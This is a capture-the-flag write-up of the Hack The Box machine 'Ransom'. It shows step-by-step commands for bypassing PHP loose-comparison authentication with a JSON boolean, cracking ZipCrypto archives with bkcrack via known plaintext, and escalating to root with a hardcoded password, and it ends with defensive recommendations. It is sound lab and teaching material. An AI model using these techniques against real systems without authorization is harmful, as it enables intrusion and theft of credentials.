---
title: "Ransom — PHP Type Juggling and ZipCrypto Known-Plaintext"
description: "A PHP loose-comparison flaw bypasses authentication; a ZIP archive's ZipCrypto encryption is broken via known-plaintext to recover an SSH key, and a hardcoded credential in Laravel source provides root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - php
  - laravel
---

## Summary

Ransom is a medium-difficulty Linux machine running a Laravel web application with a flawed authentication endpoint. A PHP loose type comparison allows a boolean `true` to bypass password validation. Post-authentication, a downloadable ZIP archive encrypted with ZipCrypto is decrypted via a known-plaintext attack against a predictable `.bash_logout` file. The recovered SSH private key provides initial access. Privilege escalation leverages a hardcoded plaintext password in the Laravel authentication controller source code. All target-specific values below are replaced with role-based placeholders.

## Context and Objective

Target operating system: Linux. Two ports are open (SSH on port 22, HTTP on port 80). The HTTP service hosts a Laravel application with a login form accepting a password field only (no username). The objective is to identify and exploit authentication weaknesses, escalate privileges, and obtain root access.

## Approach and Evidence

### Login Endpoint Analysis

Inspecting the login form reveals it sends a GET request with the password as a query parameter:

```
GET /api/login?password=<TEST_VALUE> HTTP/1.1
```

A POST request returns `Method Not Allowed`. Sending a JSON body with a string password via GET returns an invalid-password response. Testing a JSON boolean `true` as the password value:

```bash
curl -s http://<TARGET_IP>/api/login \
  -H "Content-Type: application/json" \
  -d '{"password": true}'
# Login Successful
```

PHP's loose comparison operator (`==`) evaluates `true == "<any_string>"` as `true` regardless of the string value. The authentication code uses `==` to compare input to the expected credential string, so a boolean `true` satisfies the comparison. A session cookie is set after successful authentication.

### Post-Authentication File Access

Navigating the authenticated application reveals a downloadable file: `uploaded-file-3422.zip`. Inspection shows ZipCrypto encryption:

```bash
7z l -slt uploaded-file-3422.zip | grep -i "method\|encrypt"
# Method = ZipCrypto Deflate
# Encrypted = +
```

### ZipCrypto Known-Plaintext Attack

ZipCrypto is vulnerable to known-plaintext attacks when at least 12 bytes of a compressed file's plaintext are known. The archive contains `.bash_logout`, whose content on Ubuntu 20.04 is predictable and fixed.

A reference ZIP with the known file is created for key recovery:

```bash
zip plain.zip .bash_logout
```

Key recovery using bkcrack:

```bash
./bkcrack -C uploaded-file-3422.zip \
  -c .bash_logout \
  -P plain.zip \
  -p .bash_logout
# Keys recovered: <KEY_1> <KEY_2> <KEY_3>
```

The recovered keys create an unlocked copy of the archive:

```bash
./bkcrack -C uploaded-file-3422.zip \
  -k <KEY_1> <KEY_2> <KEY_3> \
  -U unlocked.zip <NEW_PASSWORD>
7z x -p<NEW_PASSWORD> unlocked.zip
```

The archive contains `.ssh/id_rsa` and `.ssh/id_rsa.pub`. The public key reveals the username.

```bash
chmod 600 .ssh/id_rsa
ssh <LAB_USER>@<TARGET_IP> -i .ssh/id_rsa
```

User flag obtained.

### Privilege Escalation — Laravel Source Code Analysis

The authentication controller contains a hardcoded credential string:

```bash
find /srv/prod -name "*.php" | xargs grep -l "password" 2>/dev/null
cat /srv/prod/app/Http/Controllers/AuthController.php
```

```php
public function customLogin(Request $request) {
    $request->validate(['password' => 'required']);

    if ($request->get('password') == "<HARDCODED_CREDENTIAL>") {
        session(['loggedin' => True]);
        return "Login Successful";
    }
    return "Invalid Password";
}
```

The source reveals the credential is the same value that the type juggling bypass exploited. Escalation proceeds:

```bash
su -
# Password: <HARDCODED_CREDENTIAL>

root@ransom:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Root flag obtained.

## Challenges and Decisions

No documented obstacles beyond the technical analysis. The type juggling bypass required identifying the GET-only endpoint and testing JSON content types. The ZipCrypto attack required recognizing that predictable `.bash_logout` content provides the necessary known plaintext.

## Outcome

Two distinct authentication failures were exploited: PHP loose type comparison bypassing password validation, and ZipCrypto encryption broken via known-plaintext attack. A hardcoded credential in the Laravel controller source enabled privilege escalation to root. All findings were reproduced and documented with sanitized commands and outputs.

## Lessons and Recommendations

- **Use strict comparison in authentication logic.** PHP's `===` operator enforces type and value equality, preventing boolean bypass. Laravel's built-in `Auth::attempt()` uses bcrypt comparison internally and is not susceptible to type juggling. Audit all authentication code for `==` comparisons against credential strings.

- **Store secrets outside application source code.** Credentials hardcoded in controllers should be loaded from Laravel's `.env` file or a dedicated secrets manager. Environment variables are not stored in the codebase, are excluded from version control by convention, and can be rotated without code changes.

- **Use AES-256 encryption for ZIP archives.** ZipCrypto is cryptographically broken. Any sensitive archive should use AES-256 encryption. Files with predictable content (like shell configuration files) should not be included in sensitive archives, as they provide known-plaintext for attacks.

## References

- HTB [Ransom](https://app.hackthebox.com/machines/Ransom) machine (retired)
- PHP loose comparison semantics
- bkcrack known-plaintext ZIP decryption
